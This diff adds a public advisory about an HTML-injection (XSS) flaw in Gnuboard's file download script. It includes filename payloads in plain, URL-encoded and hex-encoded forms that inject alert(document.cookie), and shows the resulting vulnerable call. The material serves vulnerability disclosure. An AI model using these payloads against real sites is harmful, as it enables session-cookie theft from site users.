@@ -1,0 +1,21 @@
+source: http://www.securityfocus.com/bid/52622/info
+
+Gnuboard is prone to an HTML-injection vulnerability because it fails to properly sanitize user-supplied input before using it in dynamically generated content.
+
+Attacker-supplied HTML and script code would run in the context of the affected website, potentially allowing the attacker to steal cookie-based authentication credentials or control how the site is rendered to the user.
+
+Gnuboard versions prior to 4.34.21 are vulnerable.
+
+1) you can upload a file (e.g. a.txt) to the BBS.
+2) you can download it from the following scripts and figure out what's working on.
+   ### vulnerable code #########################################################################################################################
+   javascript:file_download('./download.php?bo_table=test&wr_id=13&no=0&sca=&sfl=&stx=&sst=&sod=&spt=0&page=0', 'a.txt');
+   #############################################################################################################################################
+3) you can also upload a file with name of XSS code. The following is the example.
+   - ');alert(document.cookie);//
+   - %27);alert(document.cookie);%2f%2f
+   - %27%29%3b%61%6c%65%72%74%28%64%6f%63%75%6d%65%6e%74%2e%63%6f%6f%6b%69%65%29%2f%2f
+   ### vulnerable code #########################################################################################################################
+   javascript:file_download('./download.php?bo_table=test&wr_id=13&no=0&sca=&sfl=&stx=&sst=&sod=&spt=0&page=0', '');alert(document.cookie);//');
+   #############################################################################################################################################
+4) The example file works by pulling in the Javascript and running it as part of the Javascript.
